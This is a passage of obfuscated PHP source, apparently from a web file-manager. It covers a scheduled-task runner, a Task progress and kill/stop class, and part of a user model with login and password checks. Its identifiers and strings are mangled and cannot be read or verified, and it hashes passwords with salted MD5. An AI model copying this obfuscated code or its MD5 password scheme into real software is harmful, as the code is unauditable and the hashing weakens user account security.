$Ö• É¯[$¥Ç°ß“[1620]] != $¥Ç°ß“[89]) { continue; } if (!self::taskTimeCheck($Ö• É¯)) { continue; } self::taskRun($Ö• É¯); } Hook::trigger($¥Ç°ß“[1621]); self::taskQueueRun($ê‘ºŞ©¡); } private static function taskQueueRun($ ¯†±ã€) { $­ŠÇñŞÍ = 10; while (!0) { $ÇåãĞûØ = TaskQueue::run(); if ($ÇåãĞûØ === !1) { break; } if (timeFloat() - $ ¯†±ã€ >= $­ŠÇñŞÍ) { break; } } } private static function taskTimeCheck($¶º¦ã„ğ) { $™ì­Œâ =& $_SERVER[Ãìšã«™]; $¹Çíóû = json_decode($¶º¦ã„ğ[$™ì­Œâ[196]], !0); $ùØã§ = intval($¶º¦ã„ğ[$™ì­Œâ[1611]]); $—‹Ìß‰® = strtotime($™ì­Œâ[1622] . $¹Çíóû[$™ì­Œâ[1623]] . $™ì­Œâ[1624]) - strtotime($™ì­Œâ[1625]); $½•–¿‰ë = time() - strtotime(date($™ì­Œâ[1626]) . $™ì­Œâ[1627]); $ÕîÀêÓç = $½•–¿‰ë >= $—‹Ìß‰® && $½•–¿‰ë <= $—‹Ìß‰® + 3600; switch ($¹Çíóû[$™ì­Œâ[33]]) { case $™ì­Œâ[1628]: if (time() - $ùØã§ < 3600 * 24 * 30) { return !1; } if ($¹Çíóû[$™ì­Œâ[1628]] == date($™ì­Œâ[1629]) && $ÕîÀêÓç) { return !0; } break; case $™ì­Œâ[1630]: if (time() - $ùØã§ < 3600 * 24 * 7) { return !1; } $ø­ó¼ü† = date($™ì­Œâ[1631]) == 0 ? 7 : date($™ì­Œâ[1631]); if ($¹Çíóû[$™ì­Œâ[1630]] == $ø­ó¼ü† && $ÕîÀêÓç) { return !0; } break; case $™ì­Œâ[1623]: if (time() - $ùØã§ < 3600 * 24) { return !1; } if ($ÕîÀêÓç) { return !0; } break; case $™ì­Œâ[1632]: if (time() - $ùØã§ >= floatval($¹Çíóû[$™ì­Œâ[1632]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ñ†³ü£ =& $_SERVER[Ãìšã«™]; static $¤¸Ê…å = 0; $ÚÎ¾ØÚ = 300; if (!$¤¸Ê…å) { $¤¸Ê…å = time(); } if (time() - $¤¸Ê…å < $ÚÎ¾ØÚ) { return; } $¤¸Ê…å = time(); $µêÆØ”ë = Model($Ñ†³ü£[513])->db($Ñ†³ü£[12]); if ($µêÆØ”ë) { $µêÆØ”ë->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ñ†³ü£[1633], $Ñ†³ü£[1634]); die; } } public static function taskRun($¾ ™üª) { $ÈìÛ…‘ø =& $_SERVER[Ãìšã«™]; self::log($ÈìÛ…‘ø[1635] . $¾ ™üª[$ÈìÛ…‘ø[392]] . $ÈìÛ…‘ø[1636] . $¾ ™üª[$ÈìÛ…‘ø[32]] . $ÈìÛ…‘ø[1637] . $¾ ™üª[$ÈìÛ…‘ø[1638]]); Model($ÈìÛ…‘ø[1619])->run($¾ ™üª[$ÈìÛ…‘ø[392]]); $£İşã¯à = timeFloat(); $¦œûöó = $ÈìÛ…‘ø[12]; switch ($¾ ™üª[$ÈìÛ…‘ø[33]]) { case $ÈìÛ…‘ø[302]: $òÆø×óü = url_request($¾ ™üª[$ÈìÛ…‘ø[1638]], $ÈìÛ…‘ø[225], !1, !1, !1, !1, 10); if ($òÆø×óü[$ÈìÛ…‘ø[751]]) { $¦œûöó = strlen($òÆø×óü[$ÈìÛ…‘ø[1187]]); } break; case $ÈìÛ…‘ø[224]: $¦œûöó = Hook::apply($¾ ™üª[$ÈìÛ…‘ø[1638]]); default: break; } Model($ÈìÛ…‘ø[1639])->add(array($ÈìÛ…‘ø[1640] => $ÈìÛ…‘ø[12], $ÈìÛ…‘ø[1641] => $ÈìÛ…‘ø[190], $ÈìÛ…‘ø[33] => $ÈìÛ…‘ø[1642] . $¾ ™üª[$ÈìÛ…‘ø[392]], $ÈìÛ…‘ø[1643] => json_encode(array($ÈìÛ…‘ø[32] => $¾ ™üª[$ÈìÛ…‘ø[32]], $ÈìÛ…‘ø[1644] => timeFloat() - $£İşã¯à, $ÈìÛ…‘ø[288] => $¦œûöó)))); $Ñ»×åÈÉ = $¦œûöó ? $ÈìÛ…‘ø[1645] . $¦œûöó : $ÈìÛ…‘ø[12]; self::log($ÈìÛ…‘ø[1646] . $¾ ™üª[$ÈìÛ…‘ø[392]] . $ÈìÛ…‘ø[536] . $Ñ»×åÈÉ); return !0; } private static function valueGet($ûÌ§ˆÕÇ) { $¬ƒ øºÎ =& $_SERVER[Ãìšã«™]; $ûçÒœ˜¢ = $¬ƒ øºÎ[1647]; $ıµÆÂÔ¤ = Model($¬ƒ øºÎ[433])->get($ûÌ§ˆÕÇ, $ûçÒœ˜¢); if (is_null($ıµÆÂÔ¤)) { Model($¬ƒ øºÎ[433])->set($¬ƒ øºÎ[751], $¬ƒ øºÎ[89], $ûçÒœ˜¢); Model($¬ƒ øºÎ[433])->set($¬ƒ øºÎ[1610], $¬ƒ øºÎ[190], $ûçÒœ˜¢); $ıµÆÂÔ¤ = Model($¬ƒ øºÎ[433])->get($ûÌ§ˆÕÇ, $ûçÒœ˜¢); } return $ıµÆÂÔ¤; } private static function valueSet($‘ë——İ—, $¯ïÈ ®‚) { $˜í‹´ø® =& $_SERVER[Ãìšã«™]; $ßİŠë‚ = $˜í‹´ø®[1648]; CacheLock::lock($ßİŠë‚); $‹§÷§äƒ = Model($˜í‹´ø®[433])->set($‘ë——İ—, $¯ïÈ ®‚, $˜í‹´ø®[1647]); CacheLock::unlock($ßİŠë‚); return $‹§÷§äƒ; } protected static function log($˜Ò—‘”) { write_log($˜Ò—‘”, $_SERVER[Ãìšã«™][1634]); } private static function cacheClear() { $Íú¤åÓù =& $_SERVER[Ãìšã«™]; Cache::clearMemory(Model($Íú¤åÓù[433])->cacheKey($Íú¤åÓù[1647])); Cache::clearMemory(Model($Íú¤åÓù[433])->cacheKey($Íú¤åÓù[1649])); Model($Íú¤åÓù[1619])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($èşÇŞá , $×âøÊªŞ = '', $º¯ÊÉÚí = 0, $ºı›³‰¼ = '') { $°Âüµê =& $_SERVER[Ãìšã«™]; if (self::get($èşÇŞá )) { return; } $this->task = array($°Âüµê[392] => $èşÇŞá , $°Âüµê[1650] => USER_ID, $°Âüµê[1548] => $ºı›³‰¼, $°Âüµê[33] => $×âøÊªŞ, $°Âüµê[1060] => $°Âüµê[12], $°Âüµê[787] => $º¯ÊÉÚí, $°Âüµê[1651] => 0, $°Âüµê[1652] => 0, $°Âüµê[1653] => 0, $°Âüµê[1654] => timeFloat(), $°Âüµê[1655] => 0, $°Âüµê[1656] => 0, $°Âüµê[1657] => 0, $°Âüµê[1658] => 0, $°Âüµê[751] => $°Âüµê[1610]); $GLOBALS[$°Âüµê[1659]] = 1; Hook::bind($°Âüµê[1613], array($this, $°Âüµê[1660])); Hook::bind($°Âüµê[1661], array($this, $°Âüµê[1662])); $this->startAfter(); Hook::trigger($°Âüµê[1663], $this->task); $this->task[$°Âüµê[1656]] = timeFloat(); } public function end() { $Ù«Áş† =& $_SERVER[Ãìšã«™]; if (!$this->task) { return; } if ($this->task[$Ù«Áş†[1656]]) { self::valueSet($this->task[$Ù«Áş†[392]], !1); } $óôåÈİ = timeFloat() - $this->task[$Ù«Áş†[1654]]; self::log($Ù«Áş†[1664] . $this->task[$Ù«Áş†[392]] . $Ù«Áş†[1665] . $óôåÈİ . $Ù«Áş†[1666]); Hook::unbind($Ù«Áş†[1613], array($this, $Ù«Áş†[1660])); Hook::unbind($Ù«Áş†[1661], array($this, $Ù«Áş†[1662])); $this->endAfter(); $this->task = !1; } public function update($ñøÄÛîÃ = 0, $¹ş­Û‰í = false) { $…®®Éç‹ =& $_SERVER[Ãìšã«™]; $”­ÍÉÚ÷ =& $this->task; if (!$”­ÍÉÚ÷) { return; } $”­ÍÉÚ÷[$…®®Éç‹[1651]] += $ñøÄÛîÃ; $”­ÍÉÚ÷[$…®®Éç‹[1655]] = timeFloat(); if ($”­ÍÉÚ÷[$…®®Éç‹[787]]) { if ($”­ÍÉÚ÷[$…®®Éç‹[787]] < $”­ÍÉÚ÷[$…®®Éç‹[1651]]) { $”­ÍÉÚ÷[$…®®Éç‹[787]] = $”­ÍÉÚ÷[$…®®Éç‹[1651]]; } $‰®Ûò¡ = timeFloat() - $”­ÍÉÚ÷[$…®®Éç‹[1654]] - $”­ÍÉÚ÷[$…®®Éç‹[1657]]; $”­ÍÉÚ÷[$…®®Éç‹[1652]] = $”­ÍÉÚ÷[$…®®Éç‹[1651]] / $”­ÍÉÚ÷[$…®®Éç‹[787]]; $”­ÍÉÚ÷[$…®®Éç‹[1653]] = $”­ÍÉÚ÷[$…®®Éç‹[1651]] / $‰®Ûò¡; if ($”­ÍÉÚ÷[$…®®Éç‹[1652]] > 0) { $”­ÍÉÚ÷[$…®®Éç‹[1658]] = $‰®Ûò¡ * (1 - $”­ÍÉÚ÷[$…®®Éç‹[1652]]) / $”­ÍÉÚ÷[$…®®Éç‹[1652]]; } $”­ÍÉÚ÷[$…®®Éç‹[1658]] = $”­ÍÉÚ÷[$…®®Éç‹[1658]] <= 0 ? 0 : $”­ÍÉÚ÷[$…®®Éç‹[1658]]; } $this->updateAfter(); $“—¦•şÌ = 0.2; if (timeFloat() - $”­ÍÉÚ÷[$…®®Éç‹[1656]] < $“—¦•şÌ && !$¹ş­Û‰í) { return; } $·›”¬’ = self::get($”­ÍÉÚ÷[$…®®Éç‹[392]]); $óÅÚ¬İ‡ = $·›”¬’[$…®®Éç‹[751]]; if ($óÅÚ¬İ‡ == self::STATYS_KILL) { $ÛšœºÁ = array($…®®Éç‹[1667] => LNG($…®®Éç‹[1668]), $…®®Éç‹[1185] => !1); Cache::set($…®®Éç‹[1669] . $this->task[$…®®Éç‹[392]], $ÛšœºÁ, 30); $this->onKill(); $this->end(); die; } else { if ($óÅÚ¬İ‡ == self::STATYS_STOP) { $ÓìâäúÚ = 2; $·›”¬’[$…®®Éç‹[1657]] += $ÓìâäúÚ; self::valueSet($”­ÍÉÚ÷[$…®®Éç‹[392]], $·›”¬’); sleep($ÓìâäúÚ); $this->update(); return; } } $”­ÍÉÚ÷[$…®®Éç‹[751]] = $óÅÚ¬İ‡ ? $óÅÚ¬İ‡ : $”­ÍÉÚ÷[$…®®Éç‹[751]]; $”­ÍÉÚ÷[$…®®Éç‹[1657]] = $·›”¬’[$…®®Éç‹[1657]] ? $·›”¬’[$…®®Éç‹[1657]] : 0; $”­ÍÉÚ÷[$…®®Éç‹[1656]] = timeFloat(); Hook::trigger($…®®Éç‹[1670], $”­ÍÉÚ÷); self::valueSet($”­ÍÉÚ÷[$…®®Éç‹[392]], $”­ÍÉÚ÷); } public function onKillSet($²ÂÖÕÄ¢, $’Û¬ÌüË = array()) { $this->onKillCall = array($²ÂÖÕÄ¢, $’Û¬ÌüË); } public function onKill() { $û½Ü³Œ• =& $_SERVER[Ãìšã«™]; self::log($û½Ü³Œ•[1664] . $this->task[$û½Ü³Œ•[392]] . $û½Ü³Œ•[1671]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ äÁµĞØ) { $„¢“ú‚ =& $_SERVER[Ãìšã«™]; Cache::set($„¢“ú‚[1669] . $this->task[$„¢“ú‚[392]], $ äÁµĞØ, 60); return $ äÁµĞØ; } public static function get($Ñ€ÁÛ©¥) { $õÇá®ßû =& $_SERVER[Ãìšã«™]; $ÙÎ™€Ô = self::valueGet($Ñ€ÁÛ©¥); if (is_array($ÙÎ™€Ô) && $ÙÎ™€Ô[$õÇá®ßû[1672]]) { $çÂòš¸½ = ActionApply($ÙÎ™€Ô[$õÇá®ßû[1672]], array($ÙÎ™€Ô)); $ÙÎ™€Ô = is_array($çÂòš¸½) ? $çÂòš¸½ : $ÙÎ™€Ô; } return $ÙÎ™€Ô; } public static function listData() { $Ì“ÅÓ¡á = self::valueGet(); return array_sort_by($Ì“ÅÓ¡á, $_SERVER[Ãìšã«™][1654], !0); } public static function kill($î’¼½×ß) { return self::changeStatus($î’¼½×ß, self::STATYS_KILL); } public static function stop($ûø§œ«Ä) { return self::changeStatus($ûø§œ«Ä, self::STATYS_STOP); } public static function restart($Ú‘ö¿óğ) { return self::changeStatus($Ú‘ö¿óğ, self::STATYS_RUNNING); } public static function killAll() { $¾óÓ¹Â¡ =& $_SERVER[Ãìšã«™]; $Ä«¼«“ = self::listData(); foreach ($Ä«¼«“ as $ôåŸü¬û) { self::kill($ôåŸü¬û[$¾óÓ¹Â¡[392]]); } sleep(2); foreach ($Ä«¼«“ as $ôåŸü¬û) { self::valueSet($ôåŸü¬û[$¾óÓ¹Â¡[392]], !1); } } private static function changeStatus($Ïôƒ°ë¨, $×Ğ¡õôµ) { $ª€„ø =& $_SERVER[Ãìšã«™]; $É­ÁæÀº = self::valueGet($Ïôƒ°ë¨); if (!$É­ÁæÀº) { return !1; } $É­ÁæÀº[$ª€„ø[751]] = $×Ğ¡õôµ; self::valueSet($Ïôƒ°ë¨, $É­ÁæÀº); self::log($ª€„ø[1673] . $É­ÁæÀº[$ª€„ø[392]] . $ª€„ø[1674] . $×Ğ¡õôµ); return !0; } public static function valueGet($¢øüõÁ± = false) { $‚èˆ¹óÖ =& $_SERVER[Ãìšã«™]; if ($¢øüõÁ±) { $¨¬’»¶Ø = Model($‚èˆ¹óÖ[445])->where(array($‚èˆ¹óÖ[95] => $¢øüõÁ±, $‚èˆ¹óÖ[33] => $‚èˆ¹óÖ[1067]))->find(); return $¨¬’»¶Ø ? json_decode($¨¬’»¶Ø[$‚èˆ¹óÖ[369]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ìü¿³© = false) { $Î„²ô¦Å =& $_SERVER[Ãìšã«™]; $ŠÅ‘¿´é = array($Î„²ô¦Å[33] => $Î„²ô¦Å[1067]); if ($ìü¿³©) { $ŠÅ‘¿´é[$Î„²ô¦Å[1650]] = $ìü¿³©; } $ÒÒ‰ÔÉ = Model($Î„²ô¦Å[445])->where($ŠÅ‘¿´é)->select(); $ÒÒ‰ÔÉ = $ÒÒ‰ÔÉ ? $ÒÒ‰ÔÉ : array(); foreach ($ÒÒ‰ÔÉ as $ÓÈÊ”±£ => $¼ö°ö½¼) { $ÒÒ‰ÔÉ[$ÓÈÊ”±£] = json_decode($¼ö°ö½¼[$Î„²ô¦Å[369]], !0); } return $ÒÒ‰ÔÉ; } public static function valueSet($Éâùàûï, $ÛÅùØ½) { $ÑÃÁñı¢ =& $_SERVER[Ãìšã«™]; if (!$ÛÅùØ½) { return Model($ÑÃÁñı¢[445])->where(array($ÑÃÁñı¢[95] => $Éâùàûï, $ÑÃÁñı¢[33] => $ÑÃÁñı¢[1067]))->delete(); } $©ˆæùÃ = json_encode($ÛÅùØ½); if (!$©ˆæùÃ) { ob_start(); var_dump($ÛÅùØ½); $µÆÔñ—± = ob_get_clean(); self::log($ÑÃÁñı¢[1675] . json_encode_force($µÆÔñ—±)); } if (!$Éâùàûï || !$ÛÅùØ½[$ÑÃÁñı¢[392]]) { return !1; } $ê–Ö«Ÿ™ = array($ÑÃÁñı¢[33] => $ÑÃÁñı¢[1067], $ÑÃÁñı¢[1650] => USER_ID, $ÑÃÁñı¢[95] => $Éâùàûï, $ÑÃÁñı¢[369] => $©ˆæùÃ); $¶¥Ïó¨· = $ÑÃÁñı¢[1676]; CacheLock::lock($¶¥Ïó¨·); Model($ÑÃÁñı¢[445])->add($ê–Ö«Ÿ™, array(), !0); CacheLock::unlock($¶¥Ïó¨·); } public static function log($Æ†ªîú) { if (!GLOBAL_DEBUG) { return; } write_log($Æ†ªîú, $_SERVER[Ãìšã«™][1677]); } } goto aÍÎëè¢ò; AÄÎÅ™¢¬: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\x75\x73\x65\x72\x5f\155\x65\164\141", "\x6d\x65\x74\141\106\151\x65\x6c\144" => "\165\163\145\162\x49\x44"); protected $simpleField = "\165\163\145\x72\111\104\x2c\156\x69\143\153\x4e\x61\155\x65\x2c\x6e\141\155\x65\54\141\166\141\164\x61\x72\x2c\x73\145\170\x2c\163\164\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($’³¯âá ) { $û“‚¬íÌ =& $_SERVER[Ãìšã«™]; $Ò­õÑ¿µ = $û“‚¬íÌ[2246]; return array($û“‚¬íÌ[1895] => array($’³¯âá [0], $Ò­õÑ¿µ), $û“‚¬íÌ[1897] => array($’³¯âá [0], $Ò­õÑ¿µ), $û“‚¬íÌ[2247] => array($’³¯âá [0], $Ò­õÑ¿µ)); } protected function getInfo($İ¦¯¶´, $ı–Öª·ø = false) { $³Ï‘Æ§ = $this->getInfoSimple($İ¦¯¶´); if (!is_array($³Ï‘Æ§)) { return array(); } if ($ı–Öª·ø) { return $this->_getInfoApply($³Ï‘Æ§); } return $this->cacheFunctionGet($_SERVER[Ãìšã«™][1899], $İ¦¯¶´); } protected function getInfoFull($ÍëùÈ„ñ, $ˆ°§¼µ© = false) { $Ë¥ËİÑ = $this->getInfoSimple($ÍëùÈ„ñ); if (!is_array($Ë¥ËİÑ)) { return array(); } if ($ˆ°§¼µ©) { return $this->_getInfoApply($Ë¥ËİÑ, !0); } return $this->cacheFunctionGet($_SERVER[Ãìšã«™][2248], $ÍëùÈ„ñ); } private function _getInfoApply($’½şÀ»Â, $±îÃ£¹¼ = false) { $÷èÃ†Ì® =& $_SERVER[Ãìšã«™]; if (!$’½şÀ»Â) { return $’½şÀ»Â; } $‡¬ œÏ‰ = md5($÷èÃ†Ì®[2249] . $’½şÀ»Â[$÷èÃ†Ì®[885]] . $÷èÃ†Ì®[2250] . $’½şÀ»Â[$÷èÃ†Ì®[32]]); $’½şÀ»Â = $this->_listDataApplyItem($’½şÀ»Â); $»Ó¥‚ƒ† = Model($÷èÃ†Ì®[1321])->metaGet($’½şÀ»Â[$÷èÃ†Ì®[87]][$÷èÃ†Ì®[403]]); $’½şÀ»Â[$÷èÃ†Ì®[2251]] = $‡¬ œÏ‰; $’½şÀ»Â[$÷èÃ†Ì®[87]][$÷èÃ†Ì®[2081]] = isset($»Ó¥‚ƒ†[$÷èÃ†Ì®[2082]]) ? $»Ó¥‚ƒ†[$÷èÃ†Ì®[2082]] : null; if ($±îÃ£¹¼) { $’½şÀ»Â[$÷èÃ†Ì®[465]] = $this->metaGet($’½şÀ»Â[$÷èÃ†Ì®[1650]]); } return $’½şÀ»Â; } protected function getInfoSimple($ãÙÜü¿, $› ãêŠœ = false) { $òóä”ª =& $_SERVER[Ãìšã«™]; if (!$ãÙÜü¿) { return array(); } if ($› ãêŠœ) { $¬û¦Æ¥Ë = $this->where(array($òóä”ª[1650] => intval($ãÙÜü¿)))->find(); if (!is_array($¬û¦Æ¥Ë)) { return array(); } $¬û¦Æ¥Ë[$òóä”ª[2252]] = Action($òóä”ª[2253])->parseUrl($¬û¦Æ¥Ë[$òóä”ª[2252]]); return $¬û¦Æ¥Ë; } return $this->cacheFunctionGet($òóä”ª[1900], $ãÙÜü¿); } protected function getInfoSimpleOuter($ÓÍö°‡ì) { $¥¦İÏÍı =& $_SERVER[Ãìšã«™]; if (!$ÓÍö°‡ì || $ÓÍö°‡ì == 0) { return array($¥¦İÏÍı[1650] => $¥¦İÏÍı[190], $¥¦İÏÍı[32] => $¥¦İÏÍı[159] . LNG($¥¦İÏÍı[2254]) . $¥¦İÏÍı[536], $¥¦İÏÍı[2252] => STATIC_PATH . $¥¦İÏÍı[2255]); } $ô¶÷­ºç = $this->cacheFunctionGet($¥¦İÏÍı[1900], $ÓÍö°‡ì); $í‚—´Ñ = array_field_key($ô¶÷­ºç, explode($¥¦İÏÍı[50], $this->simpleField)); if (!$í‚—´Ñ) { return array($¥¦İÏÍı[1650] => $¥¦İÏÍı[1184], $¥¦İÏÍı[32] => $¥¦İÏÍı[159] . LNG($¥¦İÏÍı[2256]) . $¥¦İÏÍı[536], $¥¦İÏÍı[2252] => STATIC_PATH . $¥¦İÏÍı[2257]); } $í‚—´Ñ[$¥¦İÏÍı[2252]] = Action($¥¦İÏÍı[2253])->parseUrl($í‚—´Ñ[$¥¦İÏÍı[2252]]); return $í‚—´Ñ; } protected function groupUser($ò•õó™ğ) { } public static function errorLang($ä††½™™) { $ÏœøÒ˜ƒ =& $_SERVER[Ãìšã«™]; $Œ™×¸­ = array(self::ERROR_USER_NOT_EXISTS => $ÏœøÒ˜ƒ[2258], self::ERROR_USER_PASSWORD_ERROR => $ÏœøÒ˜ƒ[2259], self::ERROR_USER_EXIST_NAME => $ÏœøÒ˜ƒ[2260], self::ERROR_USER_EXIST_PHONE => $ÏœøÒ˜ƒ[2261], self::ERROR_USER_EXIST_EMAIL => $ÏœøÒ˜ƒ[2262], self::ERROR_USER_LOGIN_LOCK => $ÏœøÒ˜ƒ[2263], self::ERROR_IP_NOT_ALLOW => $ÏœøÒ˜ƒ[2264], self::ERROR_USER_EXIST_NICKNAME => $ÏœøÒ˜ƒ[2265]); return LNG($Œ™×¸­[$ä††½™™]); } public function getInfoByMeta($ƒËüÃ, $µÅó€“¿) { $¦¹öÈúğ =& $_SERVER[Ãìšã«™]; $®‚¡©åË = Model($¦¹öÈúğ[2266])->where(array($¦¹öÈúğ[95] => $ƒËüÃ, $¦¹öÈúğ[369] => $µÅó€“¿))->find(); if ($®‚¡©åË) { return $this->getInfo($®‚¡©åË[$¦¹öÈúğ[1650]]); } return !1; } public function userLoginCheck($ƒã˜¢¢, $Á—ïâšŠ) { $×äèŒ´à =& $_SERVER[Ãìšã«™]; $Äº•Âƒ = $this->userLoginFind($ƒã˜¢¢); if (!$Äº•Âƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Äº•Âƒ[$×äèŒ´à[1650]], $Á—ïâšŠ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Äº•Âƒ[$×äèŒ´à[1650]]); } public function userLoginFind($‘Ê®ÁÜ‘) { $İñ³ö§Œ =& $_SERVER[Ãìšã«™]; $î§‡¤‘« = array($İñ³ö§Œ[32] => $‘Ê®ÁÜ‘, $İñ³ö§Œ[2086] => $‘Ê®ÁÜ‘, $İñ³ö§Œ[300] => $‘Ê®ÁÜ‘, $İñ³ö§Œ[2267] => $‘Ê®ÁÜ‘, $İñ³ö§Œ[996] => $İñ³ö§Œ[998]); if ($this->nickNameRpt()) { unset($î§‡¤‘«[$İñ³ö§Œ[2086]]); } return $this->where($î§‡¤‘«)->find(); } public function clearCache($ğúÛ²ŞÔ) { $­É¾Ÿš =& $_SERVER[Ãìšã«™]; $this->cacheFunctionClear($­É¾Ÿš[1899], $ğúÛ²ŞÔ); $this->cacheFunctionClear($­É¾Ÿš[1900], $ğúÛ²ŞÔ); $this->cacheFunctionClear($­É¾Ÿš[2248], $ğúÛ²ŞÔ); } public function userPasswordCheck($’‚°À£Æ, $ÈÇâáÂÂ) { $±—Ğ‚ô³ =& $_SERVER[Ãìšã«™]; $­ãóôË³ = $this->where(array($±—Ğ‚ô³[1650] => intval($’‚°À£Æ)))->find(); $‘ÙØÜÁ¿ = $this->metaGet($’‚°À£Æ); $Ğ‹˜ø¤ì = isset($‘ÙØÜÁ¿[$±—Ğ‚ô³[2268]]) ? $‘ÙØÜÁ¿[$±—Ğ‚ô³[2268]] : $±—Ğ‚ô³[12]; if (md5($Ğ‹˜ø¤ì . trim($ÈÇâáÂÂ)) !== $­ãóôË³[$±—Ğ‚ô³[885]]) { return !1; } return !0; } public function userAdd($Ìø¯¹İ£) { $€±ÃŞ£ú =& $_SERVER[Ãìšã«™]; $â›‚à§˜ = array($€±ÃŞ£ú[421] => $Ìø¯¹İ£[$€±ÃŞ£ú[32]], $€±ÃŞ£ú[2269] => $Ìø¯¹İ£[$€±ÃŞ£ú[1528]], $€±ÃŞ£ú[2270] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[300]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[300]] : $€±ÃŞ£ú[12], $€±ÃŞ£ú[2271] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[2267]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[2267]] : $€±ÃŞ£ú[12], $€±ÃŞ£ú[2272] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[2086]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[2086]] : $Ìø¯¹İ£[$€±ÃŞ£ú[32]], $€±ÃŞ£ú[2273] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[2252]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[2252]] : $€±ÃŞ£ú[12], $€±ÃŞ£ú[2274] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[2275]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[2275]] : 1, $€±ÃŞ£ú[2276] => $Ìø¯¹İ£[$€±ÃŞ£ú[885]], $€±ÃŞ£ú[1901] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[1805]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[1805]] : 1024 * 1024 * 20, $€±ÃŞ£ú[1902] => 0, $€±ÃŞ£ú[2277] => 0, $€±ÃŞ£ú[1942] => isset($Ìø¯¹İ£[$€±ÃŞ£ú[751]]) ? $Ìø¯¹İ£[$€±ÃŞ£ú[751]] : 1); if (!empty($Ìø¯¹İ£[$€±ÃŞ£ú[1650]])) { $â›‚à§˜[$€±ÃŞ£ú[1650]] = $Ìø¯¹İ£[$€±ÃŞ£ú[1650]]; } $²Ê œ²µ = $this->_checkExist($Ìø¯¹İ£); if ($²Ê œ²µ !== !0) { return $²Ê œ²µ; } $§ùûİıÛ = $this->add($â›‚à§˜); $Ù‹³ÁñÅ = array($€±ÃŞ£ú[2276] => $â›‚à§˜[$€±ÃŞ£ú[885]], $€±ÃŞ£ú[2272] => $â›‚à§˜[$€±ÃŞ£ú[2086]]); $this->userEdit($§ùûİıÛ, $Ù‹³ÁñÅ); Model($€±ÃŞ£ú[1321])->userRootAdd($§ùûİıÛ); return $§ùûİıÛ; } protected function userEditTest($ÍŠÎ»›¢, $Ğ¾£ïÄ÷) { return $this->call($_SERVER[Ãìšã«™][2278], $ÍŠÎ»›¢, $Ğ¾£ïÄ÷); } protected function userEdit($¢Âô¤ª, $àãº•è–) { $ …ëüç— =& $_SERVER[Ãìšã«™]; $¥‹şı¥Ş = $this->getInfoSimple($¢Âô¤ª); if (!$¥‹şı¥Ş) { return !1; } $ÄÈíãÎÓ = $this->_checkExist($àãº•è–, $¢Âô¤ª); if ($ÄÈíãÎÓ !== !0) { return $ÄÈíãÎÓ; } if (isset($àãº•è–[$ …ëüç—[885]]) && trim($àãº•è–[$ …ëüç—[885]]) != $ …ëüç—[12]) { $ºˆ¯Ú­ç = $this->metaGet($¢Âô¤ª); if (empty($ºˆ¯Ú­ç[$ …ëüç—[2268]])) { $ºˆ¯Ú­ç[$ …ëüç—[2268]] = rand_string(10); Model($ …ëüç—[513])->metaSet($¢Âô¤ª, $ …ëüç—[2268], $ºˆ¯Ú­ç[$ …ëüç—[2268]]); } $àãº•è–[$ …ëüç—[885]] = md5($ºˆ¯Ú­ç[$ …ëüç—[2268]] . trim($àãº•è–[$ …ëüç—[885]])); } else { unset($àãº•è–[$ …ëüç—[885]]); } $this->where(array($ …ëüç—[1641] => $¢Âô¤ª))->save($àãº•è–); if (isset($àãº•è–[$ …ëüç—[2086]])) { $this->setNamePinyin($¢Âô¤ª, $àãº•è–[$ …ëüç—[2086]]); } $this->clearCache($¢Âô¤ª); return !0; } public function setNamePinyin($ĞÖÛÀ™™, $î¼ûËª¿ = false) { $ãšı“± =& $_SERVER[Ãìšã«™]; if (!$î¼ûËª¿) { $îÆ¥¯¨ = $this->getInfoSimple($ĞÖÛÀ™™); $î¼ûËª¿ = $îÆ¥¯¨[$ãšı“±[2086]] ? $îÆ¥¯¨[$ãšı“±[2086]] : $îÆ¥¯¨[$ãšı“±[32]]; } $Øó‚ºåÅ = Model($ãšı“±[538]); if (!Input::check($î¼ûËª¿, $ãšı“±[587])) { return $Øó‚ºåÅ->metaSet($ĞÖÛÀ™™, array($ãšı“±[464] => $ãšı“±[12], $ãšı“±[463] => $ãšı“±[12])); } return $Øó‚ºåÅ->metaSet($ĞÖÛÀ™™, array($ãšı“±[464] => str_replace($ãšı“±[53], $ãšı“±[12], Pinyin::get($î¼ûËª¿)), $ãšı“±[463] => Pinyin::get($î¼ûËª¿, $ãšı“±[588]))); } private function nickNameRpt() { $íª²Æ½¯ =& $_SERVER[Ãìšã«™]; $îÇ¯¤ò = Model($íª²Æ½¯[771])->get($íª²Æ½¯[2279]); $„‘„°Ÿ‰ = $GLOBALS[$íª²Æ½¯[6]][$íª²Æ½¯[376]][$íª²Æ½¯[2279]]; $‰“Õ¯½ = !is_null($îÇ¯¤ò) ? $îÇ¯¤ò : 